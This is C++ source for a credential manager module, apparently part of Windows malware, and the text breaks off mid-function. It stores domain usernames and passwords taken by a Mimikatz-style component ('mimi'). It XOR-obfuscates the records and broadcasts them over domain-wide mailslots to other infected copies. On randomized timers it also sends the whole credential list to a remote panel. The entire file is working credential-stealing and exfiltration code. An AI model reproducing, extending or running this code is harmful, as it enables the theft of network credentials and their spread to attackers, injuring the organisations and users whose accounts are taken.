/*
	CredManager.cpp
	Credentials manager functions. Provides API to query local or some remote credentials (domain, username, password) grabbed by other copies on the local network.
	After start, maintains internal list filled by mimi or broadcasted messages, which is queried by API

	Note: for another workgroup/domain or for machine outside caller's domain, search routines should prefer accounts originatin from source machine (domain + machine match)

	Contains both client and server parts
*/

#include <Windows.h>

#include "dbg.h"
#include "CredManager.h"

#ifdef ROUTINES_BY_PTR

CredManager_ptrs CredManager_apis;	// global var for transparent name translation into call-by-pointer	

// should be called before any other apis used to fill internal structures
VOID CredManager_resolve(CredManager_ptrs *apis)
{
#ifdef _DEBUG
	if (IsBadReadPtr(apis, sizeof(CredManager_ptrs))) { DbgPrint("DBG_ERR: bad read ptr %p len %u", apis, sizeof(CredManager_ptrs)); }
#endif
	// save to a global var
	CredManager_apis = *apis;
}

#else 

#include "mem.h"
#include "dbg.h"
#include "CryptoStrings.h"
#include "HashedStrings.h"
#include "RandomGen.h"
#include "MailslotWorks.h"
#include "DataCallbackManager.h"
#include "MyStreams.h"
#include "..\shared\CommStructures.h"


// internal globals
BOOL g_cmInitDone = FALSE;	// set to TRUE when internal init was already performed

BOOL g_bcmBroadcasterStarted = FALSE;	// set when broadcasting routines are running

CRITICAL_SECTION g_csListAccess;	// guard to access linked list
CRED_LIST_CHUNK	g_clHead;			// singly linked list's head
SIZE_T			g_lclItemCount;		// amount of items saved in ^



/*
	Fill passed structure with ptrs to all exported functions
	Used when module compiled as code to provide ptrs to some other child code
*/
VOID CredManager_imports(CredManager_ptrs *apis)
{
	apis->fncmftNow = cmftNow;
	apis->fncmAddCredentials = cmAddCredentials;
	apis->fncmGetCredentialsForDomain = cmGetCredentialsForDomain;
}


// called in order to init some internal structures
// returns TRUE if init was really performed, otherwise FALSE
BOOL _cmCheckInitInternals()
{
	if (!g_cmInitDone) {

		DbgPrint("performing init");

		InitializeCriticalSection(&g_csListAccess);
		g_lclItemCount = 0;
		g_clHead = { 0 };

		// set init done flag
		g_cmInitDone = TRUE;
		return TRUE;

	} else { /*DbgPrint("already initialized");*/ return FALSE; }
}


// adds a record after all uniq checks are done
// adds an item to global chain 
// NB: caller should hold cs lock already when calling this function
VOID _cmChainAddChunk(CRED_LIST_CHUNK *newchunk)
{

	//DbgPrint("newchunk=%p", newchunk);

	newchunk->lcNext = g_clHead.lcNext;
	g_clHead.lcNext = newchunk;

	g_lclItemCount++;
	//DbgPrint("new items count is %u", g_lclItemCount);

}


// removes passed chunk from chain and deallocates it's buffers
// WARN: may be called while _cmEnumRecords() in progress
// NB: caller should already hold cs lock on list
BOOL _cmChainRemoveChunk(CRED_LIST_CHUNK *delchunk)
{
	BOOL bRes = FALSE;	// function result
	CRED_LIST_CHUNK *cur;	// current chunk in enum procedure
	CRED_LIST_CHUNK *prev = NULL;	// chunk, previous for delchunk, determined using re-scan

	if (!g_lclItemCount) { DbgPrint("ERR: chain is empty"); return FALSE; }
	if (!delchunk) { DbgPrint("ERR: NULL ptr passed"); return FALSE; }

	DbgPrint("removing chunk at %p", delchunk);

	// set first item
	cur = g_clHead.lcNext;

	// enum chain to find ptr to delchunk, detecting it's prev item
	while (cur) {

		// check if found
		if (cur->lcNext == delchunk) { prev = cur;  break; }

		// move to next item
		cur = cur->lcNext;

	} // while !NULL ptr

	// check if this item was found
	if (!prev) { DbgPrint("ERR: prev chunk not found for delchunk"); return FALSE; }

	// change pointers to exclude chunk from chain
	DbgPrint("prev chunk %04Xh: changing next ptr from %04Xh to %04Xh", prev, prev->lcNext, delchunk->lcNext);
	prev->lcNext = delchunk->lcNext;
	g_lclItemCount--;

	DbgPrint("deallocating chunk at %04Xh", delchunk);
	my_free(delchunk);

	// func res
	return bRes;
}


// performs enumeration of all items in list calling passed callback function 
// to stop enum, callback should return FALSE
VOID _cmEnumRecords(CM_ENUM_CALLBACK cbCallback, LPVOID pCallbackParams)
{
	CRED_LIST_CHUNK *cur;	// current chunk in enum procedure
	CRED_LIST_CHUNK *next;	// next chunk, because cur may be removed/deallocated


	if (!g_lclItemCount) { DbgPrint("WARN: no records, exiting"); return; }

	EnterCriticalSection(&g_csListAccess);
	__try {

		//DbgPrint("enumerating %u records", g_lclItemCount);

		// NB: callback may perform removal (unlink) of chain item, so take care!
		cur = g_clHead.lcNext;

		while (cur) {

			// get next item to be used
			next = cur->lcNext;

			// invoke callback
			//DbgPrint("calling cb for chunk at %p", cur);
			if (!cbCallback(cur, pCallbackParams)) { /*DbgPrint("callback asked to stop enum");*/ break; }

			// go to next ptr using previously saved next value, because cur may be deallocated by cbCallback
			cur = next;

		}

	} __except (1) { DbgPrint("ERR: exception catched"); }
	LeaveCriticalSection(&g_csListAccess);
}

// callback invoked by _cmChainContainsChunk()
BOOL CALLBACK _cmcbChainContains(CRED_LIST_CHUNK *chunk, LPVOID pCallbackParams)
{
	BOOL bRes = TRUE;	// continue enum by default
	CCC_CALLBACK_PARAMS *ccc = (CCC_CALLBACK_PARAMS *)pCallbackParams;

	// check for match
	if (chunk == ccc->check_ptr) { 
		
		//DbgPrint("match found"); 
		bRes = FALSE;
		ccc->bFound = TRUE;

	} // matching ptrs

	return bRes;
}


// checks if chains contains such ptr to chunk
// Used between two calls to chain when first a copy was used and after a while called need to verify
// if a chunk still exists when it wants to modify some data inside
// Needed to avoid IsBadWritePtr() and seh, which not working as expected on some platforms when image is loaded disklessly
BOOL _cmChainContainsChunk(CRED_LIST_CHUNK *chk_chunk_ptr)
{
	BOOL bRes = FALSE;	// func result by default
	CCC_CALLBACK_PARAMS ccc = { 0 };

	// prepare params to be passed
	ccc.check_ptr = chk_chunk_ptr;

	// call enum
	_cmEnumRecords(_cmcbChainContains, (LPVOID)&ccc);

	// save result
	bRes = ccc.bFound;

	return bRes;
}






// encodes passed binary value into ENC_BUFFER structure
BOOL cmebEncode(LPVOID pBinaryData, DWORD dwDataLen, ENC_BUFFER *eb)
{
	BOOL bRes = FALSE;	// func result
	RndClass rg = { 0 }; // random number generator pseudo-object
	DWORD dwKey1, dwKey2;	// random values for encoding
	DWORD dwCounter = dwDataLen;	// loop counter 
	BYTE *pIn, *pOut;	// in and out buffer's ptrs

	// dbg size check
#ifdef _DEBUG
	if (dwDataLen + (2 * 4) > ENC_BUFFER_SIZE) { DbgPrint("ERR: asked to encode %u while maxlen+4 is %u", dwDataLen, ENC_BUFFER_SIZE); return bRes; }
#endif

	// init rnd gen
	rgNew(&rg);
	rg.rgInitSeedFromTime(&rg);

	// get rnd values
	dwKey1 = rg.rgGetRndDWORD(&rg);
	dwKey2 = rg.rgGetRndDWORD(&rg);

	// get ptrs
	pIn = (BYTE *)pBinaryData;
	pOut = (BYTE *)&eb->bEncBuffer[0];	//NB: first 2 DWORDs are for encoding keys

	// save keys
	memcpy(pOut, &dwKey1, sizeof(DWORD)); pOut += sizeof(DWORD);
	memcpy(pOut, &dwKey2, sizeof(DWORD)); pOut += sizeof(DWORD);

	// proceed
	while (dwCounter) {

		// gen out byte
		*pOut = *pIn ^ (BYTE)dwKey1 ^ (BYTE)dwKey2;

		// cycle keys, in different directions
		dwKey1 = ROL32(dwKey1, 3);
		dwKey2 = ROR32(dwKey2, 2);

		// move ptrs
		dwCounter--;
		pIn++;
		pOut++;

	} // while dwCounter

	// set enc buffer's size
	eb->bEncBufferLen = (BYTE)( dwDataLen + (sizeof(DWORD) * 2) );

	//DbgPrint("eb=%p eb->bEncBufferLen=%u", eb, eb->bEncBufferLen);

	bRes = TRUE;

	return bRes;
}

// wrapper for cmebEncode()
BOOL cmebEncodeW(LPWSTR wszData, ENC_BUFFER *eb)
{
	BOOL bRes;	// function result
	LPSTR szutf8_Buffer;	// utf8 encoding buffer
	int iBufferLen;	// len of ^ buffer
	int iBytesWritten;	// amount of bytes written to utf-8 buffer

	// translate string into UTF-8
	iBufferLen = lstrlenW(wszData) * 4;
	szutf8_Buffer = (LPSTR)my_alloc(iBufferLen);
	iBytesWritten = WideCharToMultiByte(CP_UTF8, 0, wszData, -1, szutf8_Buffer, iBufferLen, NULL, NULL);

	bRes = cmebEncode(szutf8_Buffer, iBytesWritten, eb);

	// free mem used
	my_free(szutf8_Buffer);

	return bRes;
}


// decodes single ENC_BUFFER into already allocated buffer
// NB: caller responsible for allocating sufficient buffer and supplying valid structures
BOOL cmebDecode(ENC_BUFFER *eb, LPVOID pOutBuffer, DWORD *dwOutLen)
{
	BOOL bRes = FALSE;	// func result
	DWORD dwCounter = eb->bEncBufferLen - (sizeof(DWORD)*2);	// loop counter 
	BYTE *pIn, *pOut;	// in and out buffer's ptrs
	DWORD dwKey1, dwKey2;	// encoding keys at buffer

	DWORD *dwP = (DWORD *)eb->bEncBuffer;	// to ease key dwords access

	// get keys
	dwKey1 = *dwP;	dwP++;
	dwKey2 = *dwP;

	// set ptrs
	pIn = (BYTE *)&eb->bEncBuffer[0]; pIn += sizeof(DWORD) * 2;	// pass by keys
	pOut = (BYTE *)pOutBuffer;

	// save resulting len
	*dwOutLen = dwCounter;

	// do working loop
	while (dwCounter) {

		// gen out byte
		*pOut = *pIn ^ (BYTE)dwKey1 ^ (BYTE)dwKey2;

		// cycle keys, in different directions
		dwKey1 = ROL32(dwKey1, 3);
		dwKey2 = ROR32(dwKey2, 2);

		// move ptrs
		dwCounter--;
		pIn++;
		pOut++;

	} // dwCounter

	bRes = TRUE;

	return bRes;
}

/*
	wrapper for cmebDecode which allocates buffer and passes it to caller
	NB: caller should deallocated buffer itself, if returned
	NB2: returns NULL on decode error
*/
LPWSTR cmebDecodeW(ENC_BUFFER *eb)
{
	LPSTR szUtf8 = NULL;	
	DWORD dwLen = 0;
	LPWSTR wszAnsi = NULL;	// resulting ansi buffer
	int iBufferLen;	// len of buffer to be used

	do { // not a loop

		iBufferLen = eb->bEncBufferLen * 4;
		szUtf8 = (LPSTR)my_alloc(iBufferLen);	// extra sufficient buffer

		// do decoding of string
		if (!cmebDecode(eb, szUtf8, &dwLen)) {
			DbgPrint("ERR: decode failed");
			break;
		} // decode

		// translate from utf-8 to ansi utf-16 codepage
		wszAnsi = (LPWSTR)my_alloc(iBufferLen);
		if (!MultiByteToWideChar(CP_UTF8, 0, szUtf8, dwLen, wszAnsi, iBufferLen / 2)) {

			DbgPrint("ERR: MultiByteToWideChar() failed while converting from utf-8 into ansi, le %p", GetLastError());
			my_free(wszAnsi);
			wszAnsi = NULL;
		}

	} while (FALSE);	// not a loop

	// free buffers
	if (szUtf8) { my_free(szUtf8); }

	return wszAnsi;
}

// callback invoked at thrcmCredBroadcaster() to select a chunk with 0 or minimum dwLastSentTicks
// in order to send newer records
BOOL CALLBACK _cmcbSelectMinLastSent(CRED_LIST_CHUNK *chunk, LPVOID pCallbackParams)
{
	BOOL bRes = TRUE;	// continue enum by default
	TCB_CALLBACK_PARAMS *tcp = (TCB_CALLBACK_PARAMS *)pCallbackParams;

	// check if we have a lower value OR it's the first call
	if ( (chunk->cr.dwLastSentTicks < tcp->chunk.cr.dwLastSentTicks) || (!tcp->orig_chunk_ptr)) {

		// correct dbg msg
		//if (chunk->cr.dwLastSentTicks < tcp->chunk.cr.dwLastSentTicks) { DbgPrint("got lower ticks %u instead of %u", chunk->cr.dwLastSentTicks, tcp->chunk.cr.dwLastSentTicks); }
		//if (!tcp->orig_chunk_ptr) { DbgPrint("initial assign"); }

		// save ptr and structure's values
		tcp->orig_chunk_ptr = chunk;
		tcp->chunk = *chunk;

	}


	// in case of zero value catched - stop enum
	if (!chunk->cr.dwLastSentTicks) { /*DbgPrint("zero dwLastSentTicks in current chunk, no need to enum further");*/ bRes = FALSE; }

	return bRes;
}

// converts FILETIME into LARGE_INTEGER
LARGE_INTEGER __ft2li(FILETIME ft)
{
	LARGE_INTEGER res;

	res.LowPart = ft.dwLowDateTime;
	res.HighPart = ft.dwHighDateTime;

	return res;
}

// converts back LARGE_INTEGER into FILETIME
FILETIME __li2ft(LARGE_INTEGER li)
{
	FILETIME res;

	res.dwLowDateTime = li.LowPart;
	res.dwHighDateTime = li.HighPart;

	return res;
}


// callback for DataCallbackManager, which receives a chunk of data, potentially a remote credmanager's record
// registered at WorkDispatcher.cpp init phase
// returns TRUE when data is accepted and processed
BOOL CALLBACK cmMailslotBroadcastInProcessingDataCallback(DISPATCHER_CALLBACK_PARAMS *dcp)
{
	BOOL bRes = FALSE;	// by default, tell we were unable to process data, and let it go to other registered callbacks
	SERIALIZED_CREDS_BUFFER *scb;	// ptr to data in a newly allocated buffer
	ADD_CREDS_RECORD acr = { 0 };	// input for cmAddCredentials() call
	ENC_BUFFER eb;	// flat structure with encoded data
	BYTE *pPtr;	// moving ptr

	// check for mailslot source with MMI_CREDENTIALS id from header
	if ((dcp->csType == ST_MAILSLOT) && (dcp->lInBufferLen < 424) && (dcp->lInBufferLen > sizeof(SERIALIZED_CREDS_BUFFER)) && (dcp->bInputMessageId == MMI_CREDENTIALS)) {

		//DbgPrint("acceptable msg params(ST_MAILSLOT, len %u in accepted len [%u..%u]), attempting to parse data", dcp->lInBufferLen, sizeof(SERIALIZED_CREDS_BUFFER), 424);

		// copy data into internal buffer 
		scb = (SERIALIZED_CREDS_BUFFER *)my_alloc(dcp->lInBufferLen);
		memcpy(scb, dcp->pInBuffer, dcp->lInBufferLen);

		// dexor
		_cmDoXor(scb->dwRandomKey1, scb->dwRandomKey2, (LPVOID)((SIZE_T)scb + (sizeof(DWORD) * 2)), dcp->lInBufferLen - (sizeof(DWORD) * 2));

		// check length
		if (sizeof(SERIALIZED_CREDS_BUFFER) + scb->blen_SourceMachineName + scb->blen_Domain + scb->blen_Username + scb->blen_Password == dcp->lInBufferLen) {

			do { // not a loop

				// check ok, do deserialization and fill api structure
				acr.dwLen = sizeof(ADD_CREDS_RECORD);
				// enc_buffers order
				// <SourceMachineName><Domain><Username><Password>
				pPtr = (BYTE *)((SIZE_T)scb + sizeof(SERIALIZED_CREDS_BUFFER));	// ptr to start of varfields
				eb.bEncBufferLen = scb->blen_SourceMachineName;		memcpy(eb.bEncBuffer, pPtr, eb.bEncBufferLen); pPtr += eb.bEncBufferLen;
				if (!(acr.wszSourceMachineName = cmebDecodeW(&eb))) { DbgPrint("ERR: wszSourceMachineName decode failed"); break; }

				eb.bEncBufferLen = scb->blen_Domain;	memcpy(eb.bEncBuffer, pPtr, eb.bEncBufferLen); pPtr += eb.bEncBufferLen;
				if (!(acr.wszDomain = cmebDecodeW(&eb))) { DbgPrint("ERR: wszDomain decode failed"); break; }

				eb.bEncBufferLen = scb->blen_Username;	memcpy(eb.bEncBuffer, pPtr, eb.bEncBufferLen); pPtr += eb.bEncBufferLen;
				if (!(acr.wszUsername = cmebDecodeW(&eb))) { DbgPrint("ERR: wszUsername decode failed"); break; }

				eb.bEncBufferLen = scb->blen_Password; memcpy(eb.bEncBuffer, pPtr, eb.bEncBufferLen);
				if (!(acr.wszPassword = cmebDecodeW(&eb))) { DbgPrint("ERR: wszPassword decode failed"); break; }

				acr.coOrigin = CRED_ORIGIN_NETWORK;
				acr.coOrigin2 = (ENUM_CRED_ORIGIN)scb->bOrigin2;

				acr.bAccessLevel = scb->bAccessLevel;

				acr.ftReceived = cmftNow();
				acr.ftGathered = __li2ft(scb->liGatheredStamp);

				// do add, with auto uniq check
				if (cmAddCredentials(&acr)) { DbgPrint("cmAddCredentials() OK, nice creds added"); bRes = TRUE; }

			} while (FALSE);	// not a loop

			// free buffs
			if (acr.wszPassword) { my_free(acr.wszPassword); }
			if (acr.wszUsername) { my_free(acr.wszUsername); }
			if (acr.wszDomain) { my_free(acr.wszDomain); }
			if (acr.wszSourceMachineName) { my_free(acr.wszSourceMachineName); }

		} //else { DbgPrint("size check failed, expected %u, computed %u", dcp->lInBufferLen, sizeof(SERIALIZED_CREDS_BUFFER) + scb->blen_SourceMachineName + scb->blen_Domain + scb->blen_Username + scb->blen_Password); }

		// free used mem
		my_free(scb);

	} // check size

	return bRes;
}

/*
	Returns a byte from 8-byte key. bPos range should be [0..7]
*/
BYTE inline _cmGetXorByte(UINT64 i64Key, BYTE bPos)
{
	return (BYTE)((i64Key >> (bPos * 8)) & 0xFF);
}

/*
	Simple encoding-decoding of buffer according to passed keys
*/
VOID _cmDoXor(DWORD dwKey1, DWORD dwKey2, LPVOID pBuffer, DWORD lBufferLen)
{
	UINT64 i64Key = ((UINT64)dwKey1 << 32) + dwKey2;	// for resulting key
	BYTE *pb = (BYTE *)pBuffer;
	DWORD dwCnt = 0;

	//DbgPrint("dwKey1=%04Xh dwkey2=%04Xh", dwKey1, dwKey2);

	while (dwCnt < lBufferLen) {

		*pb ^= _cmGetXorByte(i64Key, (dwCnt & 0x07));	// resulting range is [0..7]

		//DbgPrint("dwCnt=%u i=%u xor_byte=%u", dwCnt, (dwCnt & 0x07), _cmGetXorByte(i64Key, (dwCnt & 0x07)));

		dwCnt++;
		pb++;
	}

}


// performs serialization/encoding of creds data buffer into pBuffer 
// resulting buffer should be <424 bytes to fit mailslot's specs on connectionless broadcast & domain-wide broadcast
// If CreateFile specifies a domain or uses the asterisk format to specify the system's primary domain, the application cannot write more than 424 bytes at a time to the mailslot.
BOOL _cmSerializeCredData(CRED_LIST_CHUNK *chunk, LPVOID pBuffer, DWORD *dwLen)
{
	BOOL bRes = FALSE;	// function result
	SERIALIZED_CREDS_BUFFER *scb = (SERIALIZED_CREDS_BUFFER *)pBuffer;	// do not access this until all check are performed
	RndClass rg = { 0 }; // random number generator pseudo-object
	BYTE *pb;	// ptr where to write varlen fields, adjustable

	DWORD dwNeededBufferLen;

	//DbgPrint("entered, chunk=%p target pBuffer=%p", chunk, pBuffer);

	// check for params passed
	if ((!chunk) || (!pBuffer) || (!dwLen) || (!*dwLen)) { DbgPrint("ERR: invalid params passed"); return bRes; }

	// check buffer size
	dwNeededBufferLen = sizeof(SERIALIZED_CREDS_BUFFER) +
		chunk->cr.ebSourceMachineName.bEncBufferLen +
		chunk->cr.ebDomain.bEncBufferLen +
		chunk->cr.ebUsername.bEncBufferLen +
		chunk->cr.ebPassword.bEncBufferLen;
	if (*dwLen < dwNeededBufferLen) { DbgPrint("ERR: passed buff len %u is too small to hold resulting chunk", *dwLen); return bRes; }

	/*DbgPrint("size parts: sizeof(SERIALIZED_CREDS_BUFFER)=%u ebSourceMachineName.len=%u ebDomain.len=%u ebUsername.len=%u ebPassword.len=%u", 
			sizeof(SERIALIZED_CREDS_BUFFER), 
			chunk->cr.ebSourceMachineName.bEncBufferLen,
			chunk->cr.ebDomain.bEncBufferLen,
			chunk->cr.ebUsername.bEncBufferLen,
			chunk->cr.ebPassword.bEncBufferLen);*/

	// ok, store actual packet size
	*dwLen = dwNeededBufferLen;

	// init rnd generator
	rgNew(&rg);
	rg.rgInitSeedFromTime(&rg);

	// all checks done ok, use casted ptr
	scb->dwRandomKey1 = rg.rgGetRndDWORD(&rg);
	scb->dwRandomKey2 = rg.rgGetRndDWORD(&rg);

	scb->liGatheredStamp = __ft2li(chunk->cr.ftGathered);
	scb->bOrigin2 = (BYTE)chunk->cr.coOrigin2;
	scb->bAccessLevel = chunk->cr.bAccessLevel;

	// varlen field's sizes
	scb->blen_SourceMachineName = chunk->cr.ebSourceMachineName.bEncBufferLen;
	scb->blen_Domain = chunk->cr.ebDomain.bEncBufferLen;
	scb->blen_Username = chunk->cr.ebUsername.bEncBufferLen;
	scb->blen_Password = chunk->cr.ebPassword.bEncBufferLen;

	// now append encoded buffers moving ptr 
	pb = (BYTE *)((SIZE_T)scb + sizeof(SERIALIZED_CREDS_BUFFER));

	// order is <SourceMachineName><Domain><Username><Password>
	memcpy(pb, chunk->cr.ebSourceMachineName.bEncBuffer, chunk->cr.ebSourceMachineName.bEncBufferLen); pb += chunk->cr.ebSourceMachineName.bEncBufferLen;
	memcpy(pb, chunk->cr.ebDomain.bEncBuffer, chunk->cr.ebDomain.bEncBufferLen); pb += chunk->cr.ebDomain.bEncBufferLen;
	memcpy(pb, chunk->cr.ebUsername.bEncBuffer, chunk->cr.ebUsername.bEncBufferLen); pb += chunk->cr.ebUsername.bEncBufferLen;
	memcpy(pb, chunk->cr.ebPassword.bEncBuffer, chunk->cr.ebPassword.bEncBufferLen); pb += chunk->cr.ebPassword.bEncBufferLen;

	// now do encoding of entire msg with rnd-based xor
	_cmDoXor(scb->dwRandomKey1, scb->dwRandomKey2, (LPVOID)((SIZE_T)scb + (sizeof(DWORD) * 2)), dwNeededBufferLen - (sizeof(DWORD) * 2));

	/*DbgPrint("res parts: dwRKey1=%p dwRKey2=%p sizeof(SERIALIZED_CREDS_BUFFER)=%u ebSourceMachineName.len=%u ebDomain.len=%u ebUsername.len=%u ebPassword.len=%u",
		scb->dwRandomKey1, 
		scb->dwRandomKey2,
		sizeof(SERIALIZED_CREDS_BUFFER),
		chunk->cr.ebSourceMachineName.bEncBufferLen,
		chunk->cr.ebDomain.bEncBufferLen,
		chunk->cr.ebUsername.bEncBufferLen,
		chunk->cr.ebPassword.bEncBufferLen);*/

	bRes = TRUE;

	return bRes;
}



// performs broadcasting of passed chunk to all available domains
// NB: this function receives a copy of chunk from thrcmCredBroadcaster()
BOOL _cmBroadcastChunk(CRED_LIST_CHUNK *chunk)
{
	BOOL bRes = FALSE;	// func result
	LPVOID pBroadcastBuffer;	// buffer to hold data to be sent, <400 bytes recommended
	DWORD dwBroadcastBufferLen = 1024; // len of ^

	//DbgPrint("entered");

	// alloc mem
	pBroadcastBuffer = my_alloc(1024);

	// call data converter/serializer
	_cmSerializeCredData(chunk, pBroadcastBuffer, &dwBroadcastBufferLen);
	//DbgPrint("resulting serialized buffer is %u bytes", dwBroadcastBufferLen);

	// do send
	bRes = mwSendMailslotMessageToAllDomains(pBroadcastBuffer, dwBroadcastBufferLen, MMI_CREDENTIALS);

	// free mem used
	my_free(pBroadcastBuffer);

	return bRes;
}


// callback invoked at thrcmCredBroadcaster() to make a buffer with all available
// creds serialized to be sent to remote server with volatile tag assigned (chunk waiting to be sent
// is constantly updated with a newer, more actual value)
BOOL CALLBACK _cmcbSerializeAll(CRED_LIST_CHUNK *chunk, LPVOID pCallbackParams)
{
	BOOL bRes = TRUE;	// continue enum by default
	MY_STREAM *myStream = (MY_STREAM *)pCallbackParams;	// passed param
	LPVOID pBuffer = NULL;	// buffer to store a single serialization result
	DWORD dwBufferLen = 1024;	// initial buffer size & amount of data returned from serialization function

	pBuffer = my_alloc(dwBufferLen);

	if (!(_cmSerializeCredData(chunk, pBuffer, &dwBufferLen))) { DbgPrint("WARN: failed to serialize"); } else {

		// serialized ok, append to stream
		myStream->msWriteStream(myStream, pBuffer, dwBufferLen);
	}

	// free mem used
	my_free(pBuffer);

	return bRes;
}


/*
	Receives a buffer with all the creds serialized, prepared inner envelope and 
	issue a ST_NETWORK_SEND with volatile tag set
	NB: this does not guarantee a chunk is to be sent at the same moment
*/
VOID _cmSendSerializedCredsBuffer(MY_STREAM *myStream)
{
	INNER_ENVELOPE *iEnvelope = NULL;	// inner envelope ptr to be used with data
//	LPVOID pBuffer = NULL;	// buffer to hold data + envelope
//	SIZE_T lBufferLen = 0;	// ^ size

	DISPATCHER_CALLBACK_PARAMS dcp = { 0 };	// params structure to be sent to callback server
	CLIENTDISPATCHERFUNC pServingCallback = dcmGetServerCallback();


	if (!myStream->lDataLen) { DbgPrint("ERR: empty serialized buffer passed, exiting"); return; }

	// alloc resulting buffer
	dcp.lInBufferLen = myStream->lDataLen + sizeof(INNER_ENVELOPE);

	if (!(dcp.pInBuffer = my_alloc(dcp.lInBufferLen))) { DbgPrint("ERR: failed to alloc %u bytes", dcp.lInBufferLen); return; }

	//DbgPrint("res buff %u, data only is %u", dcp.lInBufferLen, myStream->lDataLen)

	// cast ptr
	iEnvelope = (INNER_ENVELOPE *)dcp.pInBuffer;

	// fill inner envelope
	iEnvelope->dwDataLen = myStream->lDataLen;
	iEnvelope->wEnvelopeId = EID_CREDENTIALS_LIST;
	cmsFillInnerEnvelope(iEnvelope);

	// append data
	memcpy((LPVOID)((SIZE_T)dcp.pInBuffer + sizeof(INNER_ENVELOPE)), myStream->pData, myStream->lDataLen);

	// issue cmd to send buffer
	// fill structure
	dcp.csType = ST_NETWORK_SEND;
	dcp.ppParams.vciType = VOLATILE_CREDS;
	dcp.ppParams.vsSource = SOURCE_LOCAL;

	//dcp.pInBuffer = pBuffer;
	//dcp.lInBufferLen = lBufferLen;

	// issue callback
	//DbgPrint("sending to cb: ptr=%p len=%u", dcp.pInBuffer, dcp.lInBufferLen);
	pServingCallback(&dcp);

	// free used mem
	my_free(dcp.pInBuffer);
}


// thread broadcasting credentials from local list into all available networks
// using Mailslot messages
DWORD WINAPI thrcmCredBroadcaster(LPVOID lpParameter)
{
	RndClass rg = { 0 }; // random number generator pseudo-object
	TCB_CALLBACK_PARAMS tcp = { 0 };	// params structure to be passed to callback
	MY_STREAM myStream = { 0 };	// stream pseudo-object for all creds serialization

	DbgPrint("entered");

	// init rnd
	rgNew(&rg);
	rg.rgInitSeedFromTime(&rg);

	// infinite working loop
	while (TRUE) {

		// check if anything is on the list
		if (g_lclItemCount) {

			//DbgPrint("we have %u items for broadcasting", g_lclItemCount);

			// call cb which serializes all creds available and send it to a buffer to be sent to remote server
			msInitStream(&myStream);
			_cmEnumRecords(_cmcbSerializeAll, &myStream);
			_cmSendSerializedCredsBuffer(&myStream);
			myStream.msFreeStream(&myStream);
			//DbgPrint("sent to remote pnl");

			// select an item with 0 or minimum dwLastSentTicks value via callback
			tcp = { 0 };
			_cmEnumRecords(_cmcbSelectMinLastSent, &tcp);

			// do broadcasting to all domains, may take some time
			//DbgPrint("broadcasting..");
			_cmBroadcastChunk(&tcp.chunk);
			//DbgPrint("done broadcasting, entering cs..");

			// enter lock second time, to modify chunk's params
			EnterCriticalSection(&g_csListAccess);
			//DbgPrint("got cs");

			__try {

				// check if saved ptr is still in the chain -> it is safe to use it
				// we cannot just IsBadWritePtr() or seh it, because it may not work on in-mem load, especially in x64 target
				if (_cmChainContainsChunk(tcp.orig_chunk_ptr)) {

					// set broadcasting time via saved chunk's ptr
					tcp.orig_chunk_ptr->cr.dwLastSentTicks = GetTickCount();

				} // ptr still in the chunk

			} __except (1) { DbgPrint("WARN: exception catched"); }

			LeaveCriticalSection(&g_csListAccess);

		} // g_lclItemCount

		// some random wait before making next step
		//DbgPrint("going to sleep");
#ifdef _DEBUG
		// debug - 2-5 s
		Sleep(rg.rgGetRnd(&rg, 2000, 5000));
#else
		// release - 20 - 650 s
		//Sleep(rg.rgGetRnd(&rg, 2000, 65000) * 10);
		Sleep(rg.rgGetRnd(&rg, 2000, 15000));
#endif
		//DbgPrint("walking up");

	} // infinite working loop

	ExitThread(0);
}


// creates broadcaster thread which will send all items from internal list to network
VOID cmStartupNetworkBroadcaster()
{
	HANDLE hThread;	// CreateThread()'s handle to be closed
	DWORD dwThreadId;

	DbgPrint("entered");

	// check if a broadcaster was already started within current process
	if (g_bcmBroadcasterStarted) { DbgPrint("ERR: already started, exiting"); return; }

	_cmCheckInitInternals();

	// create worker thread
	hThread = CreateThread(NULL, 0, thrcmCredBroadcaster, NULL, 0, &dwThreadId);

	// set flag
	g_bcmBroadcasterStarted = TRUE;

}


// returns TRUE if LARGE_INTEGER value ftA is greater than ftB
// used to correctly compare UTC dates in FILETIME format
BOOL _cmIsFileTimeGreater(FILETIME ftA, FILETIME ftB)
{
	
	LARGE_INTEGER liA, liB;	// as stated in msdn

	// prepare locals
	liA.LowPart = ftA.dwLowDateTime;
	liA.HighPart = ftA.dwHighDateTime;

	liB.LowPart = ftB.dwLowDateTime;
	liB.HighPart = ftB.dwHighDateTime;
	
	// do compare
	if (liA.QuadPart > liB.QuadPart) { return TRUE; } else { return FALSE; }
}


// callback enum function for cmAddCredentials()
// checks for dups and removes outdated records
// called while holding cs lock, so it is safe to perform manipulations on chain
BOOL CALLBACK _cmcbAddCredentialsEnum(CRED_LIST_CHUNK *chunk, LPVOID pCallbackParams)
{
	BOOL bRes = TRUE;	// continue enum by default
	AC_CALLBACK_PARAMS *acp = (AC_CALLBACK_PARAMS *)pCallbackParams;

	// check domain+username as primary key
	if (chunk->cr.i64DomainUsernameHash == acp->i64DomainUsernameHash) {

		// check if password same -> sure dup
		if (chunk->cr.i64PasswordHash == acp->i64PasswordHash) {
			
			//DbgPrint("duplicating record detected, passwords are same");
			acp->bIsDuplicate = TRUE;
			return FALSE;	// no enum needed anymore

		} // same passwords

		// if we got here, then password is different, first check if it's origin is local machine
		if (acp->ceOrigin == CRED_ORIGIN_LOCAL) {

			// new chunk gathered from local machine contains another password, remove record from chain
			DbgPrint("duplicating chunk is from local source, removing saved one");
			_cmChainRemoveChunk(chunk);
			return FALSE;	// no enum needed further

		} // local cred origin

		// got here if origin is network, in this case check which one is more fresh
		if (_cmIsFileTimeGreater(acp->ftGathered, chunk->cr.ftGathered)) {

			DbgPrint("duplicating chunk contains newer stamp, removing saved one");
			_cmChainRemoveChunk(chunk);
			return FALSE;	// no enum needed further

		} // fresher timestamp

		// so this is a true dup, mark and stop enum
		DbgPrint("WARN: duplicating record with another pwd, no rule triggered, throwing new chunk away");
		acp->bIsDuplicate = TRUE;
		return FALSE;

	} // domain+username hash same

	return bRes;
}

/*
	returns current filetime stamp to be used by routines, calling cmAddCredentials()
*/
FILETIME cmftNow()
{
	FILETIME ftRes;
	SYSTEMTIME st;

	GetSystemTime(&st);              // Gets the current system time
	SystemTimeToFileTime(&st, &ftRes);  // Converts the current system time to file time format

	return ftRes;
}

// adds a record to local db, called by mimi's parser, network listener, or any other source according to coOrigin enum value
// record is checked for dups (domain + username)
BOOL cmAddCredentials(ADD_CREDS_RECORD *acr)
{
	BOOL bRes = FALSE;	// function result
	AC_CALLBACK_PARAMS acp = { 0 }; // internal params to be passed to enum function

